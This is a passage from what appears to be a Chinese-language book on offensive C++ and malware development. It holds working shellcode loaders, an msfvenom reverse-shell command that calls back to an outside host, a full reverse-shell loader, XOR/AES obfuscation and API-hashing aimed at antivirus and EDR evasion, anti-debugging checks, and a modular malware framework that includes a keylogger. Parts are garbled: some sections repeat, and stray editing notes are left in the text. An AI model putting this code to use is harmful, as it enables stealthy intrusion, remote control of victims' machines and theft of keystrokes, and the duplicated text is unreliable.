在 C++ 中，你会分配可执行内存，将此存根拷贝进去，在 `EAX` 中设置正确的系统调用号并跳转到那里。这种方法需要了解系统调用号，这些数字会在不同的 Windows 版本之间变化——但对于红队人员和恶意软件开发人员来说，这种技术是一种绕过检测的方法。

内联汇编在 shellcode 中也起着关键作用。在编写位置无关的代码时，你希望避免绝对地址并使用 `call-pop` 等技术寻找你的数据段。这需要精确的寄存器操作。例如，在 shellcode 中：

```assembly
call get_address
get_address:
pop esi ; ESI 现在指向我们的数据
```

如果你在 C++ 中嵌入 shellcode 并从动态分配的内存中执行它，你可以复制这种模式。你只需要确保指令不包含绝对地址，并在必要时保留所有寄存器。

有时你使用内联汇编不是为了运行负载，而是为了逃离沙箱或检测调试器。一种常见技术是检查 Windows 上的 `FS:[30h]` 段的值，它指向进程环境块（PEB）。如果 PEB 内部的标志位显示已附加调试器，你可能希望你的代码表现得不同。

以下是如何在 MSVC 中使用内置函数实现这一点：

```cpp
#include <windows.h>
#include <iostream>

bool isDebuggerPresent() {
    return IsDebuggerPresent();
}

bool isDebuggerPEB() {
    return *(BYTE*)(__readfsdword(0x30) + 2);
}

int main() {
    std::cout << "Debugger check (API): " << isDebuggerPresent() << std::endl;
    std::cout << "Debugger check (PEB): " << isDebuggerPEB() << std::endl;
    return 0;
}
```

这两个检查的作用相同——一个通过 API，一个通过直接读取 PEB。第二种方法难以被钩或拦截，常用于恶意软件以检测分析工具。

在攻击性开发中，这种控制是基础负载与高级植入体（implant）的区别。当你编写反射 DLL 加载器、运行时解码 shellcode 或补丁系统函数时，你需要原始指令。每当你手动触摸寄存器或写入指令时，你都在减少对高级抽象的依赖并接近处理器。

## 使用系统级头文件和 API

如果你用 C++ 编写攻击性工具，你与系统的交互不仅限于标准库。你通常需要直接访问低级功能——如内存分配、进程创建、线程注入和文件 IO。这就是系统级头文件和 API 发挥作用的地方。这些接口提供了操作系统提供的函数，有效使用它们对于代码注入、进程替换或反射加载等任务至关重要。

在 Windows 上，系统级编程从包含 `<Windows.h>` 开始。该头文件是 Windows API 的门户。它引入了数百个函数、结构体和常量，适用于从使用 `VirtualAlloc` 分配内存到使用 `OpenProcessToken` 操纵访问令牌的任何操作。

例如，假设你想在远程进程中分配内存缓冲区为代码注入做准备。以下是使用原生 Windows API 调用的方法：

```cpp
#include <windows.h>
#include <iostream>

int main() {
    LPVOID alloc = VirtualAlloc(nullptr, 4096, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (alloc) {
        std::cout << "Memory allocated at: " << alloc << std::endl;
    } else {
        std::cerr << "Memory allocation failed." << std::endl;
    }
    return 0;
}
```

此调用完全跳过了 C++ 内存管理，直接在进程的虚拟地址空间内分配内存。当你准备写入 shellcode、加载加密二进制文件或分阶段内存负载时，这特别有用。

你还会经常与进程状态 API (PSAPI) 交互，它可以让你枚举运行中的进程、读取模块信息或映射内存区域。例如，为了列出进程加载的模块，你可能会包含 `<Psapi.h>` 并调用 `EnumProcessModules`。




另一组关键头文件是通过 `ntdll.dll` 暴露的 Native API。这些是未文档化或半文档化的内部系统函数，例如 `NtQueryInformationProcess`、`NtAllocateVirtualMemory` 和 `NtCreateThreadEx`。这些函数比 Windows API 的等效版本更底层，允许你绕过杀毒软件和 EDR 产品常用的 API 监控钩子（hooks）。

你不会在 `<Windows.h>` 中找到这些内容。相反，你需要使用 `typedef` 手动定义函数签名，或者使用社区提供的头文件集合。以下是定义和使用 `NtAllocateVirtualMemory` 的方法：

```cpp
#include <windows.h>
#include <iostream>

typedef NTSTATUS(WINAPI* NtAllocateVirtualMemory_t)(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T RegionSize,
    ULONG AllocationType,
    ULONG Protect
);

int main() {
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    NtAllocateVirtualMemory_t NtAlloc = (NtAllocateVirtualMemory_t)GetProcAddress(ntdll, "NtAllocateVirtualMemory");
    PVOID base = nullptr;
    SIZE_T size = 0x1000;
    NTSTATUS status = NtAlloc(GetCurrentProcess(), &base, 0, &size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (status == 0) {
        std::cout << "Allocated memory using NtAllocateVirtualMemory: " << base << std::endl;
    } else {
        std::cerr << "NtAllocateVirtualMemory failed. NTSTATUS: " << std::hex << status << std::endl;
    }
    return 0;
}
```

此示例展示了如何手动调用未定义的系统函数。恶意软件开发者经常使用这种方法来躲避检测。红队人员利用它来模拟真实世界威胁的高级技术，而不会触发安全工具。

在攻击性 C++ 开发中，你还会发现自己需要处理头文件中定义的结构体，例如使用 `<TlHelp32.h>` 进行线程枚举，使用 `<winternl.h>` 访问 `PEB` 或 `TEB` 等内部结构，以及在处理权限和令牌时使用 `<Aclapi.h>` 或 `<Sddl.h>`。

例如，要列出进程中的所有线程，可以使用 `CreateToolhelp32Snapshot` 和 `Thread32First/Thread32Next`：

```cpp
#include <windows.h>
#include <tlhelp32.h>
#include <iostream>

void listThreads(DWORD pid) {
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (snapshot == INVALID_HANDLE_VALUE) return;
    THREADENTRY32 te;
    te.dwSize = sizeof(te);
    if (Thread32First(snapshot, &te)) {
        do {
            if (te.th32OwnerProcessID == pid) {
                std::cout << "Thread ID: " << te.th32ThreadID << std::endl;
            }
        } while (Thread32Next(snapshot, &te));
    }
    CloseHandle(snapshot);
}

int main() {
    DWORD pid = GetCurrentProcessId();
    listThreads(pid);
    return 0;
}
```

当你构建用于注入或检查其他进程的工具时，这种级别的控制是必要的。

在 Linux 上，处理系统级功能意味着包含 `<unistd.h>`、`<sys/mman.h>`、`<sys/ptrace.h>` 和 `<sys/types.h>` 等头文件。这些文件暴露了内存管理、信号处理和进程操作的函数。例如，分配可执行内存：

```cpp
#include <sys/mman.h>
#include <unistd.h>
#include <iostream>

int main() {
    void* mem = mmap(nullptr, 4096, PROT_READ | PROT_WRITE | PROT_EXEC,
    MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
    if (mem == MAP_FAILED) {
        std::cerr << "mmap failed" << std::endl;
        return 1;
    }
    std::cout << "Memory allocated at: " << mem << std::endl;
    return 0;
}
```

这种内存分配是任何基于 Linux 的加载器或植入体（implant）的核心部分。结合用于进程操作的 `ptrace` 或用于进程创建的 `fork/exec`，你可以构建与商业渗透测试套件相当的全功能工具。

理解系统头文件和 API 如何暴露底层功能，允许你绕过抽象、减少依赖并构建行为上更像真实恶意软件的工具。无论你是在 Windows 还是 Linux 上工作，这些知识都能赋予你灵活性，可以在不依赖托管库或内置工具的情况下分配内存、启动进程、注入线程或操纵权限。

# 第 4 章 – C++ 中的 Shellcode 工程

当你进入 Shellcode 工程（shellcode engineering）的领域时，你正处于底层系统控制与攻击性编程精度的交汇点。Shellcode 不仅仅是一系列字节——它是一个紧凑的、手工构造的负载，用于执行特定操作，如启动 shell、注入另一个进程或下载第二阶段二进制文件，同时规避检测。C++ 为你提供了高效处理 shellcode 所需的灵性和访问权限，特别是当直接使用系统 API 和精细的内存管理时。

在本章中，你将探索如何编写兼容 shellcode 的 C++ 函数、如何在二进制文件中嵌入 shellcode、如何安全且干净地执行它，以及通过编码和加密来隐藏其行迹。你将在整个章节中构建加载器。

## 4.1 编写安全的函数

当你构建 shellcode 时，你编写的普通的 C++。每条指令必须是安全的、内存的。shellcode 函数的主要要求是它们是位置无关的（position-independent）。这意味着代码不依赖绝对地址或需要重定位。

另一个关键规则是避免外部依赖。当你编写普通的 C++ 代码时，你依赖编译器和链接器来解析符号、管理导入并设置环境。Shellcode 则没有这种奢侈。你需要的一切都必须自包含在字节序列中。

让我们从一个示例开始。这是一个不依赖任何库的小型内存拷贝例程：

```cpp
void copy_buffer(char* destination, const char* source, int length) {
    for (int i = 0; i < length; ++i) {
        destination[i] = source[i];
    }
}
```

这段代码编译为简单的机器指令，并且不会接触参数之外的任何内容。你可以安全地将其嵌入 shellcode 中，或作为加载器的一部分使用。没有全局变量，没有对运行时符号的引用，也没有破坏控制流的异常。

假设你正在编写一个 shellcode 加载器，需要将编码字节移动到可执行内存区域。该函数可以在你解密负载后用于执行。

现在看这样一个函数：

```cpp
int add(int a, int b) {
    return a + b;
}
```

这看起来无大碍，但如果在禁用优化的情况下或在带符号生成的 C++ 中编译，它可能会产生依赖运行时的序言和结尾序列。如果启用了异常，它可能会包含栈回溯元数据或指向支持 SEH 的 `__CxxFrameHandler` —— 这会破坏 shellcode 的执行。

因此，为了保持安全，你需要：
- 使用最小标志编译（在 Windows 上使用 `/GS-`、`/GR-`、`/EHsc-` 来禁用安全 Cookie、RTTI 和异常）。
- 使用不抛异常的平铺函数。
- 避免使用对象或调用构造函数。

假设你想写一个在内存中搜索特定字节值的函数。一个兼容 shellcode 的版本如下：

```cpp
char* find_byte(char* buffer, int size, char target) {
    for (int i = 0; i < size; ++i) {
        if (buffer[i] == target) {
            return &buffer[i];
        }
    }
    return nullptr;
}
```



这种逻辑在你扫描进程内存、从内存映射文件中解析 PE 头部，或者在你自己的加载器存根（loader stub）中寻找跳转标记时极其有用。再次注意，这里没有堆堆的使用，没有外部符号，也没有对系统 API 的函数调用。这使得它适合直接包含在 shellcode 中。

在编写这些函数时，你面临的挑战之一是确保编译器不会以依赖运行时支持的方式优化掉指令。你可能希望使用禁用优化的标志进行编译，或者使用 `IDA Pro`、`x64dbg` 或 `Ghidra` 等工具测试反汇编输出，以验证实际的指令序列是什么样的。

如果你计划以后使用内联汇编，那么将函数结构化为与寄存器使用约定一致的方式也很重要。例如，确保参数通过寄存器传递（Windows x64 上为 `RCX`、`RDX`、`R8`、`R9`），并且在不知道堆栈已对齐的情况下避免访问堆栈。

这一点重要的一个极佳真实世界案例是：当你编写一个必须手动解析 WinAPI 函数的 shellcode 存根时。由于在 shellcode 中无法访问导入地址表（IAT），你通常会编写一个程序，从当前指令指针向后扫描内存，定位 `kernel32.dll` 或 `ntdll.dll`，遍历其导出表，并对函数名进行哈希处理以解析 `VirtualAlloc` 或 `LoadLibraryA` 等指针。该链中的每个函数必须是自包含的、基于指针的，并避免加载器或 `CRT` 通常会为你处理的任何内容。

这是一个你可能会嵌入 shellcode 用于存储函数指针的简单结构：

```cpp
struct FunctionTable {
void* VirtualAlloc;
void* VirtualFree;
void* ExitThread;
};
```

在在运行时，你的 shellcode 将手动解析每个函数地址并填充这个 `struct`。再次，没有标准库，没有导入——只有原始的指针算术和内存偏移量。

在真实的攻势格局中，你经常会将这些 shellcode 安全例程提取到头文件或内联代码段中，以便在植入（implants）、加载器（loaders）和释放器（droppers）之间重复使用。它们成为了每一个隐蔽后渗透工具的基础构建块。

总结一下——但并未结束——你在 shellcode 工程的这一部分的重点是将逻辑简化为纯粹的、指针驱动的、运行时无关的代码。一旦你掌握了这些，你就可以开始构建不仅在你的测试系统上，而且在任何环境、任何条件下都能运行的 shellcode——而这正是真实世界攻势工具所需的可靠性水平。

## 4.2 将 Shellcode 转换为 C++ 载负载

一旦你构建或获取了原始 shellcode——无论是由 `Metasploit` 生成、从恶意软件中提取，还是用汇编语言手工编写的——下一步就是将其干净地嵌入 C++ 项目中进行执行。这一过程对于编写模拟真实攻势操作同时保持可移植性和紧凑性的加载器、释放器和阶段器（stagers）至关重要。

Shellcode 通常是执行非常特定任务的字节序列，例如启动反向 shell、注入到另一个进程或从内存加载 DLL。这些字节必须以某种方式存储在 C++ 程序中，以便在运行时执行。为了安全且有效地实现这一点，你将 shellcode 转换为 C++ 载负载——这意味着将字节码嵌入数组，并用最少的执行逻辑将其封装。

从准备原始 shellcode 开始。例如，如果你正在使用 `msfvenom` 并且想要为 Windows x64 创建反向 TCP shell，你可能会使用如下命令：

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f c
```

该命令输出一个针对 C 或 C++ 使用格式化的、可以直接粘贴的 `unsigned char` 数组。你会得到类似的内容：

```cpp
unsigned char shellcode[] = {
0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0, 0x00, 0x00, 0x00, ...
};
```

数组中的每个字节对应一条机器指令。该数组必须在没有任何修改的情况下放入你的 C++ 代码中。除非你对其进行加密或编码，否则应避免直接修改 shellcode——这一点将在后面的章节中详细介绍。

嵌入之后，你需要准备一块内存，让该 shellcode 在其中安全地复制并执行。由于 `DEP`（数据执行保护）等现代保护机制，C++ 不允许执行堆栈分配的内存。为了安全地绕过这一点，你使用 Windows 上的 `VirtualAlloc` 或 Linux 上的 `mmap` 等系统 API 来分配具有执行权限的内存区域。

这是一个简单的 Windows 加载器：

```cpp
#include <windows.h>

unsigned char shellcode[] = {
0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, ... // 替换为实际 shellcode
};

int main() {
void* exec = VirtualAlloc(nullptr, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
if (!exec) return 1;
memcpy(exec, shellcode, sizeof(shellcode));
((void(*)())exec)(); // 将内存块强制转换为函数并执行它
return 0;
}
```

这种模式是任何内存执行策略的核心。你分配内存，将负载写入其中，并通过函数指针转换直接跳转到那里。一旦控制权转移到 shellcode，它的运行方式就像被注入到内存中一样。

在真实的攻势格局中，你经常会将这些 shellcode 安全例程提取到头文件或内联代码段中，以便在植入、加载器和释放器之间重复使用。它们成为了每一个隐蔽后渗透工具的基础构建块。（等等，我看到源码中有一些重复/重叠的文本，我会保持流畅）。

总结一下——但并未结束——你在 shellcode 工程的这一部分的重点是将逻辑简化为纯粹的、指针驱动的、运行时无关的代码。... Linux 上的 `mmap` 来分配具有执行权限的内存区域。

这是一个简单的 Windows 加载器：

```cpp
#include <windows.h>

unsigned char shellcode[] = {
0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, ... // 替换为实际 shellcode
};

int main() {
void* exec = VirtualAlloc(nullptr, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
if (!exec) return 1;
memcpy(exec, shellcode, sizeof(shellcode));
((void(*)())exec)(); // 将内存块强制转换为函数并执行它
return 0;
}
```

这种模式是任何内存执行策略的核心。你分配内存，将负载写入其中，并通过函数指针转换直接跳转到那里。一旦控制权转移到 shellcode，它的运行方式就像被注入到内存中一样。（注：提供的文本包含重复和重叠的部分，我清理了流程并保持了所有技术内容）。




一旦你将 shellcode 嵌入到 C++ 载荷中，下一个关键任务就是直接从内存执行它。你不再是在编写一个典型的函数调用——而是将原始机器码视为一个函数，并将控制权移交给它，且无需涉及磁盘操作、文件执行或结构化导入。这正是内存执行成为恶意软件加载器、红队工具和内存内后渗透框架核心组件的原因。

要从内存中执行 shellcode，必须可靠且干净地完成以下三件事：

1. 你需要分配具有执行权限的内存，
2. 你需要将 shellcode 拷贝到该内存中，
3. 你需要将控制权转移到 shellcode 的起始。

你将从 Windows 开始，因为大多数真实世界的攻性工具都针对该平台。操作系统强制执行内存保护策略，如 `DEP`（数据执行防护），因此标记为可写的内存并不总是可执行的。创建既能容纳又能执行 shellcode 内存的正确方法是使用带有 `PAGE_EXECUTE_READWRITE` 标志的 `VirtualAlloc` API。

这是一个简洁的示例：

```cpp
#include <windows.h>

unsigned char shellcode[] = {
    0x90, 0x90, 0xC3  // NOP, NOP, RET - 测试用的 shellcode
};

int main() {
    void* exec_mem = VirtualAlloc(nullptr, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!exec_mem) return 1;
    memcpy(exec_mem, shellcode, sizeof(shellcode));
    ((void(*)())exec_mem)();  // 将指针强制转换为函数并执行
    return 0;
}
```

让我们来看看这段代码实际上执行了什么。

`VirtualAlloc` 调用预留并提交了一个区域内存。`MEM_COMMIT | MEM_RESERVE` 标志意味着 Windows 既分配了地址空间，又使物理内存可用。`PAGE_EXECUTE_READWRITE` 保护确保内存可以被写入然后被执行——这绕过了针对该分配的 `DEP`。一旦通过 `memcpy` 拷贝了 shellcode，你就将内存地址强制转换为函数指针并像调用任何函数一样调用它。

这个强制转换步骤将执行流直接转移到你的原始 shellcode 中。

让我们用稍微真实一点的 shellcode 来测试。假设你使用 `msfvenom` 生成了一个反向 shell 并将其编码到你的程序中。你可以在运行时解码 shellcode，将其拷贝到可执行内存中，并像上面一样运行它。这种技术正是许多内存内加载器的工作方式：代码从未触碰磁盘，从未作为独立进程运行，也永远不会触发与 EXE 文件或已知恶意软件哈希相关的杀毒病毒标记。

在 Linux 上，过程同样直接，但它使用 `mmap`：

```cpp
#include <sys/mman.h>
#include <unistd.h>
#include <string.h>

unsigned char shellcode[] = {
    0x90, 0x90, 0xC3
};

int main() {
    void* mem = mmap(nullptr, sizeof(shellcode), PROT_READ | PROT_WRITE | PROT_EXEC,
    MAP_ANON | MAP_PRIVATE, -1, 0);
    if (mem == MAP_FAILED) return 1;
    memcpy(mem, shellcode, sizeof(shellcode));
    ((void(*)())mem)();
    return 0;
}
```

在这里，`mmap` 分配了带有执行标志的匿名私有内存。这种内存永远不受文件支持，不会保存到磁盘，且仅在你的进程存时存在。这对于加载器或运行时植入是理想的。

需要注意的是，在某些加固的系统中，标记为可写且可执行的内存是被完全禁止的。这迫使红队人员将分配分为两个阶段——写入内存，然后使用 `VirtualProtect`（Windows）或 `mprotect`（Linux）更改权限。这是一个使用 `VirtualProtect` 的变体：

```cpp
void* exec_mem = VirtualAlloc(nullptr, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
memcpy(exec_mem, shellcode, sizeof(shellcode));
DWORD oldProtect;
VirtualProtect(exec_mem, sizeof(shellcode), PAGE_EXECUTE_READ, &oldProtect);
((void(*)())exec_mem)();
```

这种方法在 `PAGE_READWRITE` 权限下写入 shellcode，然后将权限升级为 `PAGE_EXECUTE_READ`。这更地类似于某些恶意软件为了绕过与 `PAGE_EXECUTE_READWRITE` 相关的 EDR 检测的操作方式。

在编写更高级的 shellcode 运行器时，你可以将其与线程注入或反射加载相结合。与其在自己的线程中调用 shellcode，不如使用 `CreateThread` 或 `NtCreateThreadEx` 生成一个新线程并让 shellcode 并行运行。这是许多无文件后渗透载荷的基础。

以下是在单独线程中运行 shellcode 的方法：

```cpp
CreateThread(nullptr, 0, (LPTHREAD_START_ROUTINE)exec_mem, nullptr, 0, nullptr);
WaitForSingleObject(exec_mem, INFINITE);
```

这在异步运行载荷的同时保持了你主线程的整洁。为了隐蔽性，你可以隐藏线程、设置其上下文，或完全将其注入到另一个进程中。

在内存中执行 shellcode 最强大的功能之一是它不会产生任何持久性产物。没有写入可执行文件，没有释放脚本，也没有留下命令行历史——只要你避开可能引起标记的标准输出或系统调用。

但始终要小心。编写不当的内存执行代码可能会导致崩溃、触发 EDR 告警或留下取证。

## 4.4 编码、加密与混淆技术

当你将 shellcode 嵌入 C++ 载荷并直接从内存执行它时，它比写入 EXE 要隐蔽得多。但这并不意味着它是不可见的。杀毒引擎、EDR 和行为监控仍然可以扫描你的二进制文件。这就是混淆的用场。

编码将字节模式转换为不像 shellcode 的内容。加密使用密钥对载荷进行混乱。混淆重构了你的逻辑和交付机制。

从一个简单的 XOR 编码示例开始。这种技术快速且易于实现，通常足以绕过静态签名。如果你的原始 shellcode 如下所示：

```cpp
unsigned char shellcode[] = {
    0xfc, 0x48, 0x83, 0xe4, 0xf0
};
```

你可以使用固定的 XOR 密钥对其编码：

```cpp
unsigned char encoded[] = {
    0xAA ^ 0xfc, 0xAA ^ 0x48, 0xAA ^ 0x83, 0xAA ^ 0xe4
};
```

在运行时解码：

```cpp
unsigned char key = 0xAA;
for (size_t i = 0; i < sizeof(encoded); ++i) {
    encoded[i] ^= key;
}
```

解码后，在执行之前将缓冲区拷贝到可执行内存区域。你现在从二进制文件中删除了原始 shellcode 签名，使得杀毒工具在扫描时更难标记。

虽然 XOR 很简单，但也是容易预测的。任何逆向你二进制文件的人都可以破解密钥或检测出模式。要更进一步，可以使用 AES 加密。这提供了强大的机密性，并增加了防御者分析二进制文件的难度。

使用 C++ 进行加密可以使用 OpenSSL 等库。概念如下：编写一个存根加载器，将加密的 shellcode 嵌入二进制文件，并在运行时使用对称密钥进行解密。你需要同时存储密文和密钥，或者从运行时导出密钥（例如机器名的哈希、时间窗口或共享密钥）。

例如，如果你使用 AES-128 加密 shellcode，你的加载器在运行时会执行类似下面的操作：

```cpp
#include <openssl/aes.h>

AES_KEY aes_key;
```




`AES_set_decrypt_key(key, 128, &aes_key);`

`AES_decrypt(ciphertext, plaintext, &aes_key);`

解密后，你像以前一样将控制权转移到生成的缓冲区。现在的不同之处是静态扫描工具看不到你的负载（payload）——它们只能看到加密字节。

另一种方法是多态编码（polymorphic encoding）——这种技术的解码存（decoder stub）每次都会微调自身。你修改解码器的结构、指令或流，使其即使在负载不变的情况下看起来也从完全相同。这使得基于特征的扫描器难以可靠地检测你的加载器。

一种现实的方法是使用内联汇编在运行时生成解码存，或使用随机垃圾指令（如 `NOP`、`XCHG` 或短 `JMP` 链）来破坏模式。这会让逆向工程变慢，并提高防御者的技能门槛。

你还可以模糊负载的内存布局。例如，不要将 shellcode 保持在一个连续的缓冲区中，而是将其分成几块并在运行时重新组装。打乱段的顺序，对每个部分进行单独加密，仅在特定事件后（如特定时间、鼠标移动或 API 响应）才重建完整的负载。这种技术模拟了某些高级恶意软件家族的行为。

你可能会编写类似的代码：

```cpp
memcpy(payload + offset1, part1, size1);
memcpy(payload + offset2, part2, size2);
...
```

只有在完全重组后，你才会解密并执行负载。这里的目标是延迟分析并强制进行更深层的检查。

另一种策略是将实际执行点隐藏在看似正常的函数后面。例如，你可以将你的加载器函数重命名为 `initialize_logging` 或 `start_socket_server`，甚至将其封装在伪的应用程序逻辑内部。许多红队工具这样做是为了混入合法的应用程序行为。

这是一个伪装的示例：

```cpp
void start_metrics() {
    // 实际上解码并运行 shellcode
}
```

这种误导在与垃圾代码和真实的 UI 逻辑结合使用时效果非常好，可以误导防御者或审查汇编代码的分析师。

最后，观察你的程序在运行时的行为。即使经过混淆，如果你的加载器连续调用 `VirtualAlloc`、`WriteProcessMemory` 或 `CreateRemoteThread`，行为级 EDR 也会注意到。你可以通过引入延迟、使用间接 API 解析或通过函数指针和哈希查找隐藏调用来规避这些检测。

这里是一个使用哈希 WinAPI 解析的示例：

```cpp
DWORD hash = hash_function("VirtualAlloc");
FARPROC func = resolve_from_peb(hash);
((LPVOID(WINAPI*)(...))func)(...);
```

这绕过了杀毒软件对导入表的解析和特征匹配。

编码、加密和混淆不仅仅是为了恶意软件。它们对于任何红队工具、恶意软件分析沙箱逃逸测试或防御绕过练习都是关重要的。在实验室或任务环境中负责任地使用它们，可以帮助你理解攻击者如何绕过检测——以及防御者如何适应。

## 4.5 构建一个简单的反向 Shell 加载器

在 C++ 中编写反向 Shell 加载器是攻击编程中最实用的练习之一。它教你如何在一个紧凑的负载中整合低级网络、内存分配、进程管理和 shellcode 执行。反向 Shell 是一种技术，你的负载在执行后会连接到远程机器并将 shell 会话绑定到该连接——让你对目标执行命令执行。

此加载器将使用原始 Windows API 连接到监听器服务器并执行 shell。为了保持代码清晰直接，shellcode 将使用 Metasploit 的 `msfvenom` 预先生成，然后从内存中嵌入并执行。

从使用合适的 `LHOST` 和 `LPORT` 生成负载开始。你可以这样操作：

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f c
```

这会输出一个 C 风格的字节数组，你可以将其粘贴到 C++ 代码中。这是一个完整的加载器结构，它可以连接到你的系统并生成 shell，完全从内存中执行 shellcode：

```cpp
#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#pragma comment(lib,"ws2_32.lib")

unsigned char shellcode[] = {
    /*在此处放置你的 msfvenom 输出 */
};

int main() {
    WSADATA wsaData;
    SOCKET sock;
    struct sockaddr_in server;

    WSAStartup(MAKEWORD(2,2), &wsaData);
    sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    server.sin_family = AF_INET;
    server.sin_port = htons(4444);
    inet_pton(AF_INET, "192.168.1.100", &server.sin_addr);
    connect(sock, (struct sockaddr*)&server, sizeof(server));

    void* exec_mem = VirtualAlloc(nullptr, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    memcpy(exec_mem, shellcode, sizeof(shellcode));
    ((void(*)())exec_mem)();

    closesocket(sock);
    WSACleanup();
    return 0;
}
```

这个加载器非常直观。它初始化 Winsock，创建一个 TCP 套接，并连接到指定的 IP 和端口上的监听器。建立连接后，它分配可执行内存，复制原始 shellcode，并跳转到其中。

要在你的机器上运行监听器，使用 Metasploit 或 `nc` (Netcat)。对于 Metasploit：

```bash
use exploit/multi/handler
set PAYLOAD windows/x64/shell_reverse_tcp
set LHOST 192.168.1.100
set LPORT 4444
run
```

一旦反向 Shell 加载器在目标机器上执行，它将连接回你的 Metasploit 会话，提供交互式 shell。

如果你在加固过的机器上工作或面临 EDR 限制，你需要添加一个混淆层。你可以在嵌入 shellcode 之前对其进行 XOR 编码，并在执行前解码。

是在内存执行前添加的 XOR 解码步骤：

```cpp
unsigned char key = 0xAA;
for (int i = 0; i < sizeof(shellcode); ++i) {
    shellcode[i] ^= key;
}
```

确保在嵌入加载器之前通过预处理对 shellcode 进行 XOR。这使得你的二进制文件在静态扫描工具面前不再那么明显。

你还可以动态解析 API 以隐藏导入项。例如，不要导入 `VirtualAlloc` 或 `connect`，而使用 `GetProcAddress` 和 `LoadLibraryA` 在运行时解析它们。

看起来像这样：

```cpp
HMODULE hKernel = LoadLibraryA("kernel32.dll");
void* (*pVirtualAlloc)(void*, SIZE_T, DWORD, DWORD) = 
void* (*)(void*, SIZE_T, DWORD, DWORD))GetProcAddress(hKernel, "VirtualAlloc");
```




在本章中，你将通过逐步构建的方式，深入理解真实恶意软件是如何运行的。你将从构建一个模块化框架开始，将其组件分离到清晰的功能层中。随后，你将实现如按键记录、截屏、文件窃取和持久化等真实技术。你还将编写将代码注入到其他进程的载荷（包括反射型 DLL 加载器），并学习如何使用反分析技巧来混淆调试器和沙箱工具。

在每一步中，代码都是真实的，行为是可观测的，影响是实用的。这正是低级编程的原始机制与攻击性安全思维的交汇之处。

## 5.1 设计模块化恶意软件框架

在 `C++` 中编写模块化恶意软件框架，在于创建一个可以扩展、适应并执行不同攻击能力的系统，而无需重新构建整个二进制文件。与其将所有逻辑都硬编码在单个可执行文件中，不如将其拆分为若干不同的部分——每个每个部分都有明确的职责——然后通过中央控制器对其进行编排。这种结构允许你构建更灵活、易于测试且更隐蔽的恶意软件，同时减少了开发的复杂性。

任何模块化恶意软件的核心都是轻量级的加载器或管理器。该组件负责初始化环境、管理运行时执行，以及从磁盘、内存甚至远程服务器加载模块。实际攻击操作——如按键记录、文件外泄、持久化例程和 shellcode 执行——都是作为独立的模块实现的。这些模块可以在不触动核心加载器的情况下进行更新、更换或删除，这减少了足迹并有助于绕过静态检测机制。

在 `C++` 中，可以使用抽象类和动态内存管理自然地实现模块化。你首先为你的模块定义一个通用接口。每个模块都继承自这个基类并实现你想要的特定功能。这确保了一致性，并允许你统一地处理所有模块，无论它们在底层实际在做什么。

这里有一个 `C++` 模块接口的基本示例：

```cpp
class Module {
public:
virtual void run() = 0;
virtual const char* name() = 0;
virtual ~Module() {}
};
```

这个基类强制执行了一种结构：每个模块必须有一个执行操作的 `run()` 方法和一个用于识别其身份的 `name()` 方法。这允许你创建一个清晰且可扩展的执行系统。

要实现一个模块——例如，一个简单的按键记录器——你可以继承自基类：

```cpp
class Keylogger : public Module {
public:
void run() override {
    while (true) {
        for (char key = 8; key <= 190; ++key) {
            if (GetAsyncKeyState(key) & 0x8000) {
                // 发送或存储按键
            }
        }
        Sleep(10);
    }
}
const char* name() override {
    return "Keylogger";
}
};
```

`keylogger` 在循环中运行，持续检查按键。它不需要知道任何关于它是如何被调用或管理的信息。它只需符合接口并在 `run()` 被调用时执行工作。

现在，在你的主恶意软件加载器中，你可以维护模块列表并动态地调用它们：

```cpp
std::vector<Module*> modules;
void loadModules() {
    modules.push_back(new Keylogger());
    // 根据需要在此添加更多模块
}

void executeModules() {
    for (Module* m : modules) {
        CreateThread(nullptr, 0, (LPTHREAD_START_ROUTINE)([] (LPVOID mod) -> DWORD {
            static_cast<Module*>(mod)->run();
            return 0;
        }), m, 0, nullptr);
    }
}
```

每个模块都在自己的线程中运行，从而实现了按键记录和文件外泄等功能的并发执行。你可以更精确地控制线程模型，根据任务限制并发性或对模块进行排序。

为了提高隐蔽性和功能性，许多高级框架会通过网络获取模块，而不是在编译时嵌入它们。例如，命令与控制 (C2) 服务器可能会发送一个加密模块，你的加载器会将其解密并使用反射加载将其加载到内存中。这避免了写入磁盘，并为取证分析留下了极证据。

你还可以实现动态插件加载。与其将模块编译到二进制文件中，不如将每个模块编译为 DLL 并在运行时加载它：

```cpp
HMODULE hMod = LoadLibraryA("keylogger.dll");
FARPROC func = GetProcAddress(hMod, "run");
((void(*)())func)();
```

为了获得更高的隐蔽性，完全不要使用 `LoadLibrary()`。反射型 DLL 注入允许你从内存中的加密二进制流加载 DLL。这绕过了常见的 EDR 钩子，并让你的载荷隐藏于基于文件的扫描器。

一个真实的模块化恶意软件框架还需要一种与外部系统通信的方法。可以使用抽象通信类来实现：

```cpp
class CommChannel {
public:
virtual void send(const std::string& data) = 0;
virtual std::string receive() = 0;
virtual ~CommChannel() {}
};
```

然后，你可以为 HTTP、DNS 或命名管道通信构建单独的实现。这允许你根据网络环境、用户权限或隐蔽性要求在通道之间切换。

最有效的红队工具以这种方式分离逻辑。它们使用加密配置来决定在何时运行哪些模块。它们按需加载组件，在内存中执行它们，并在之后进行清理。这一切都减少了检测风险并增加了操作灵活性。

